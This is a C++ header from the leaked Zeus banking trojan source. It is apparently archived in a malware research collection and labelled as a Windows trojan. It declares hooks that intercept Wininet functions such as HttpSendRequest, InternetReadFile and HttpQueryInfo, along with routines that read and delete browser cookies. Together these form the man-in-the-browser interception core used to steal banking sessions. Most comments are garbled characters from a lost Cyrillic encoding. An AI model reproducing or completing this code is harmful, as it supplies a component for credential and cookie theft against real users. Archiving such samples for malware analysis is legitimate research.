/*
  name      Zeus
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
/*
  �������� wininet.dll
*/
#pragma once

#if(BO_WININET > 0)
namespace WininetHook
{
  /*
    �������������.

    IN homePage - �������������� ��������� �������� ��������, ���� NULL ��� [0]=0, �� �� �����������.
  */
  void init(const LPWSTR homePage);

  /*
    ���������������.
  */
  void uninit(void);

  /*
    ��������� ����� Wininet.
  */
  void _getCookies(void);

  /*
    �������� ����� Wininet.
  */
  void _removeCookies(void);

  /*
    ����������� HttpSendRequestW.
  */
  BOOL WINAPI hookerHttpSendRequestW(HINTERNET request, LPWSTR headers, DWORD headersLength, LPVOID optional, DWORD optionalLength);
  
  /*
    ����������� HttpSendRequestA.
  */
  BOOL WINAPI hookerHttpSendRequestA(HINTERNET request, LPSTR headers, DWORD headersLength, LPVOID optional, DWORD optionalLength);
  
  /*
    ����������� HttpSendRequestExW.
  */
  BOOL WINAPI hookerHttpSendRequestExW(HINTERNET request, LPINTERNET_BUFFERSW buffersIn, LPINTERNET_BUFFERSW buffersOut, DWORD flags, DWORD_PTR context);
  
  /*
    ����������� HttpSendRequestExA.
  */
  BOOL WINAPI hookerHttpSendRequestExA(HINTERNET request, LPINTERNET_BUFFERSA buffersIn, LPINTERNET_BUFFERSA buffersOut, DWORD flags, DWORD_PTR context);

  /*
    ����������� InternetCloseHandle.
  */
  BOOL WINAPI hookerInternetCloseHandle(HINTERNET handle);

  /*
    ����������� InternetReadFile.
  */
  BOOL WINAPI hookerInternetReadFile(HINTERNET handle, LPVOID buffer, DWORD numberOfBytesToRead, LPDWORD numberOfBytesReaded);

  /*
    ����������� InternetReadFileExA. ����� ���������� �� InternetReadFileExW
  */
  BOOL WINAPI hookerInternetReadFileExA(HINTERNET handle, LPINTERNET_BUFFERSA buffersOut, DWORD flags, DWORD_PTR context);

  /*
    ����������� InternetQueryDataAvailable.
  */
  BOOL WINAPI hookerInternetQueryDataAvailable(HINTERNET handle, LPDWORD numberOfBytesAvailable, DWORD flags, DWORD_PTR context);
  
  /*    Interceptor HttpQueryInfoA. Also called on HttpQueryInfoW.
  */
  BOOL WINAPI hookerHttpQueryInfoA(HINTERNET request, DWORD infoLevel, LPVOID buffer, LPDWORD bufferLength, LPDWORD index);
};
#endif
